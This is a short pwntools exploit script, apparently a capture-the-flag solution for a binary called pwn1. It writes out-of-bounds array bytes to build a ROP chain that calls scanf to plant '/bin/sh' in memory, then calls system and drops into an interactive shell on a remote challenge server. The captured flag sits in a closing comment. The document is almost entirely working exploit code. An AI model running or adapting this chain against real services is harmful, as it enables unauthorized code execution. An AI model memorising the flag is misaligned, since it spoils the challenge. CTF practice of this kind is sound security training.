from pwn import *

context(log_level="debug")

# p = process("./pwn1")
p  = remote("106.75.37.29",10000)
elf = ELF("./pwn1")
scanf_plt = elf.symbols["__isoc99_scanf"]
system_plt = elf.symbols["system"]

# system_got
#0x0804857E

def add(off,value):
	p.recvuntil("input index:")
	p.sendline(str(off))
	p.recvuntil("value:")
	p.sendline(str(value))

	p.recvuntil("input index:")
	p.sendline(str(0x28-0xc))
	p.recvuntil("value:")
	p.sendline("0")
def change(off,l):
	i = 0 
	for x in l:
		p1 = x & 0xff
		p2 = (x >> 8) & 0xff
		p3 = (x >> 16) & 0xff
		p4 = (x >> 24) & 0xff
		add(60-16+i,p1)
		i+=1
		add(60-16+i,p2)
		i+=1
		add(60-16+i,p3)
		i+=1
		add(60-16+i,p4)
		i+=1
	return i
l = [scanf_plt,0x080486ae,0x080486ED,0x804A028,scanf_plt,0x080486ae,0x080486ED,0x804A02c,system_plt,0x080486ae,0x804A028]
#system_plt,0x080486ae,0x804A028

index = change(60,l)
p.recvuntil("input index:")
p.sendline(str(0x28-0xc))
p.recvuntil("value:")
p.sendline("10")
p.recvuntil("Your Array:0 0 0 0 0 0 0 0 0 0 ")
# gdb.attach(p,"b*0x0804857E\nc")
p.sendline(str(u32("/bin")))
p.sendline(str(u32("/sh\0")))
p.interactive()

#flag{9587c60c6962efc66d5adc7d18ee5500}
